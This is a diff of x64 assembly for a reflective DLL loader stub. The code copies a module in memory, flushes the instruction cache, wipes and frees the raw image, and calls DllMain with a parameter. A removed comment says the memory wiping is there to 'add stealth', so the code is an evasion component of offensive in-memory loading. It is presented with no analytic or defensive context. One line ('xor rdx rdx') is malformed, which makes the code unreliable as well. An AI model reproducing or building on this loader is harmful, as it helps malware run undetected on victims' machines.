@@ -1,5 +1,3 @@
-
-
 .code 
 
 ReflectiveLoader proc EXPORT lpParameter: LPVOID 
@@ -295,20 +293,22 @@ ReflectiveLoader proc EXPORT lpParameter: LPVOID
 	xor rcx, rcx 
 	mov ecx, dword [rbp + module_size - func_base]
 	add rdi, rcx 
+	push rcx  
 	push rdi 
-	push rcx 
 	rep movsb 
 	not rcx ; rcx = -1 
 	xor rdx rdx 
 	xor r8, r8 
 	call [rbp + ntflushinstcache_addr - func_base] 
-	pop r8
+	pop r10 
 	pop rcx 
 	mov rax, rbx 
 	add eax, dword [rdx + 28h] ; OptionalHeader.AddressOfEntryPoint
 	mov rdx, rbx 
 	mov rbx, [rbp + virtualfree_addr - func_base] 
-	call r8
+	mov r8, [rbp + loaded_module_base - func_base] 
+	mov r9, lpParameter
+	call r10 
 	
 	failure:
 	ret 
@@ -318,17 +318,25 @@ ReflectiveLoader proc EXPORT lpParameter: LPVOID
 	; rbx -> address of VirtualFree 
 	; rcx -> size of raw file 
 	; rdx -> base address of raw file 
-	; don't forget to zero memory before you free to add stealth 
+	; r8 -> base address of loaded file
+	; r9 -> lpParameter 
 	push rax 
 	xor rax,rax
 	mov rdi, rdx 
 	rep stosb 
-	pop rax 
 	mov rcx,rdx 
 	xor rdx,rdx 
-	mov r8, 0x00008000 ; MEM_RELEASE 
+	push r8 
+	xor r8, r8 
+	mov r8d, 0x00008000 ; MEM_RELEASE 
 	call rbx 
-	call rax 
+	pop r8 
+	pop rax
+	mov rcx, r8 ;hinstDll
+	inc rdx ; DLL_PROCESS_ATTACH 
+	mov r8, r9 ;lpParameter 
+	call rax ;DllMain 
+	ret 
 	cleanup_stub_end:
 	nop
 
